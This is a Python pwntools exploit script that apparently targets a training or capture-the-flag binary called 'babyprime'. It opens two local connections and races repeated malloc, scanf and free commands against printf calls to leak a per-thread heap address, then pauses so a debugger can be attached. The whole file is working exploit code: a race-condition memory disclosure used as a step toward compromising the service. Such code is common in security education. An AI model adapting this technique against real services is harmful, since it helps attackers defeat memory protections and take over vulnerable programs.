import time 
from pwn import *
import os

def leak_perthread_addr(r1, r2):
    print("Starting race condition...")
    
    if os.fork() == 0:
        # Child process: spam malloc/scanf/free operations
        for i in range(300):
            try:
                r1.sendline(b"malloc")
                r1.sendline(b"0")
                r1.sendline(b"scanf") 
                r1.sendline(b"0")
                r1.sendline(b"B" * 16)  # Shorter input, different char
                r1.sendline(b"free")
                r1.sendline(b"0")
                if i % 100 == 0:
                    print(f"Child: {i} iterations done")
            except:
                break
        print("Child process finishing normally...")
        exit(0)
    else:
        # Parent process: spam printf operations
        for i in range(300):
            try:
                r2.sendline(b"printf")
                r2.sendline(b"0")
                if i % 100 == 0:
                    print(f"Parent: {i} iterations done")
            except:
                break
        
        print("Waiting for child to finish...")
        os.wait()
        
        print("Collecting output...")
        time.sleep(0.2)
        
        try:
            output = r2.recv(timeout=2)
        except:
            output = b""
            
        print("Raw output snippet:")
        print(repr(output))  # Show more output
        
        # Simple leak detection - look for non-B, non-printable bytes
        lines = output.split(b'\n')
        for line in lines:
            if b'MESSAGE:' in line:
                msg_content = line.split(b'MESSAGE: ', 1)[1]
                
                # Skip our input and empty messages
                if msg_content in [b'NONE', b''] or msg_content == b'B' * len(msg_content):
                    continue
                
                # Look for any non-printable bytes
                has_nonprint = any(b < 32 or b > 126 for b in msg_content)
                
                if has_nonprint and len(msg_content) >= 4:
                    print(f"Found potential leak: {repr(msg_content)}")
                    
                    # Just take the raw bytes and convert
                    try:
                        leak_bytes = msg_content[:8].ljust(8, b'\x00')
                        leak = u64(leak_bytes)
                        print(f"Converted to: {hex(leak)}")
                        return leak
                    except:
                        continue
        
        print("No leak found")
        return None

# Main execution
print("Starting babyprime...")
p = process('./babyprime_level1.0_patched')
time.sleep(0.5)

print("Establishing connections...")
r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)

print(f"Main PID: {p.pid}")
print("Both connections established!")

# Perform the leak attempt
perthread_leak = leak_perthread_addr(r1, r2)

if perthread_leak:
    print(f"\n[SUCCESS] Leaked address: {hex(perthread_leak)}")
else:
    print("\n[INFO] No leak detected")

print(f"\nProcess PID: {p.pid}")
print("PAUSED FOR GDB - attach now!")
print(f"Run: gdb -p {p.pid}")
print("Then: info threads")

pause()  # GDB attachment point

print("Cleaning up...")
r1.close()
r2.close()
p.kill()
